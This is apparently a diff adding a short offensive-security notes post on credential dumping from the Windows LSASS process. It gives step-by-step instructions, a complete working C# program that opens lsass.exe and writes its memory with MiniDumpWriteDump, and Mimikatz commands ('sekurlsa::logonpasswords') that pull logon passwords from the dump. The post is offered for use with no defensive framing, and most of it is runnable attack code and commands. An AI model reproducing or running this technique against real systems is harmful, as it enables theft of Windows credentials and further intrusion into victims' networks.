@@ -1,0 +1,57 @@
+---
+layout:     post
+author:     0x5c4r3
+type: docs
+permalink: AV_Bypass
+---
+
+
+<span style="font-size: 35px; color:red"><b>LSASS</b></span>
+&nbsp;
+<span style="font-size: 25px; color:white"><b>Memory Dump</b></span>
+1) Task Manager > details tab > locate lsass.exe process > right click and _Create Dump File_.
+2) Copy it to the local machine and process it with Mimikatz 
+```
+sekurlsa::minidump lsass.dump
+sekurlsa::logonpasswords
+```
+&nbsp;
+
+---
+&nbsp;
+<span style="font-size: 25px; color:white"><b>MiniDumpWriteDump</b></span>
+
+C# application to execute a memory dump that we can parse with Mimikatz.
+```
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.IO;
+
+namespace MiniDump
+{
+    class Program
+    {
+        [DllImport("Dbghelp.dll")]
+        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, 
+          IntPtr hFile, int DumpType, IntPtr ExceptionParam, 
+          IntPtr UserStreamParam, IntPtr CallbackParam);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, 
+          int processId);
+
+        static void Main(string[] args)
+        {
+            FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp", FileMode.Create);
+            Process[] lsass = Process.GetProcessesByName("lsass");
+            int lsass_pid = lsass[0].Id;
+
+            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
+            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+        }
+    }
+}
+```
+
+Compile it and run it, you'll get a <span style="color:red">lsass.dmp</span> file to use as follows: <span style="color:red">sekurlsa::minidump lsass.dmp</span> and <span style="color:red">sekurlsa::logonpasswords</span>
